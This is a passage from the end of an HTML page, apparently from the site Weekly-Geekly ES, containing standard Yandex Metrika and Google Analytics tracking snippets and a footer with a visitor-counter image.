  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>